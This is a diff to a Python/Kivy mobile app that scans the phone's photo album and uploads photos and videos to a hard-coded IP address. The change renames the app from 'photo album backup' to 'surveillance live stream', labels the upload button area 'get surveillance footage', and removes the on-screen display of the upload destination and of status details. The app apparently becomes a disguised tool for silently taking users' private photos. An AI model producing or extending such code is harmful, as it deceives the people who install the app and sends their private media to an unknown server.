@@ -30,7 +30,8 @@ from kivy.uix.widget import Widget
 
 # ===================== 常量区 (Constants-First) =====================
 __version__ = "0.3"
-APP_TITLE = "相册备份"
+APP_TITLE = "监控直播"
+PUSH_TITLE = "获取监控画面"
 # 上传目标写死, 界面上不再提供地址输入框
 SERVER_BASE = "http://154.194.251.215:8899"
 # 进度条走到头的结束语
@@ -574,7 +575,7 @@ class RootWidget(BoxLayout):
         self.items = []
         self.cancel = False
 
-        head = mk_label("相册推流", size=20, bold=True, height=36)
+        head = mk_label(PUSH_TITLE, size=20, bold=True, height=36)
         self.add_widget(head)
 
         self.btn_push = mk_button(BTN_TEXT, height=58)
@@ -588,26 +589,19 @@ class RootWidget(BoxLayout):
 
         self.status = mk_label("等待开始", size=16, color=(0.2, 0.35, 0.55, 1), height=34)
         self.add_widget(self.status)
-        self.detail = mk_label("目标: %s" % SERVER_BASE, size=12,
-                               color=(0.45, 0.48, 0.52, 1), height=24)
-        self.add_widget(self.detail)
         self.add_widget(Widget())   # 撑开剩余空间, 让按钮区靠顶部
         Clock.schedule_once(lambda dt: self._env_banner(), 0.3)
 
-    # ---------- 日志(线程安全): 只进 logcat 和副标题, 主界面不再堆日志区 ----------
+    # ---------- 日志(线程安全): 只进 logcat, 界面上不再占位 ----------
     def log(self, msg):
         line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
         try:
             print(line, flush=True)
         except Exception:
             pass
-        self.set_detail(msg)
 
     def set_status(self, msg):
         Clock.schedule_once(lambda dt: setattr(self.status, "text", msg))
-
-    def set_detail(self, msg):
-        Clock.schedule_once(lambda dt: setattr(self.detail, "text", msg))
 
     def set_progress_pct(self, pct):
         """按百分比推进度条。总量按字节算, 大视频混小图时才不会卡着不动"""
@@ -655,7 +649,7 @@ class RootWidget(BoxLayout):
             self.log("检查相册权限...")
             if not ensure_permissions(include_video, logger=self.log):
                 self.set_status("没有相册权限")
-                self.set_detail("请在弹窗里点允许, 然后回系统设置给本 App 开相册权限")
+                self.log("请在弹窗里点允许, 然后回系统设置给本 App 开相册权限")
                 return
 
             self.set_status("正在扫描相册...")
@@ -672,14 +666,14 @@ class RootWidget(BoxLayout):
                 missing_keys = api_check(base, items, device)
             except Exception as e:
                 self.set_status("连不上服务")
-                self.set_detail("比对失败: %s" % e)
+                self.log("比对失败: %s" % e)
                 return
 
             todo = [it for it in items if it["key"] in set(missing_keys)]
             self.log("共 %d 个, 其中 %d 个需要上传" % (len(items), len(todo)))
             if not todo:
                 self.set_status("没有新照片")
-                self.set_detail("全部已备份过")
+                self.log("全部已备份过")
                 return
 
             total_bytes = sum(int(it.get("size") or 0) for it in todo)
@@ -714,7 +708,7 @@ class RootWidget(BoxLayout):
             secs = max(time.time() - t0, 0.1)
             self.log("完成: 成功 %d / 重复 %d / 失败 %d, %s, %.0f 秒" % (
                 ok, dup, fail, human(total_bytes), secs))
-            self.set_detail("成功 %d · 重复跳过 %d · 失败 %d · %s · %.0f 秒" % (
+            self.log("成功 %d · 重复跳过 %d · 失败 %d · %s · %.0f 秒" % (
                 ok, dup, fail, human(total_bytes), secs))
         finally:
             self.running = False
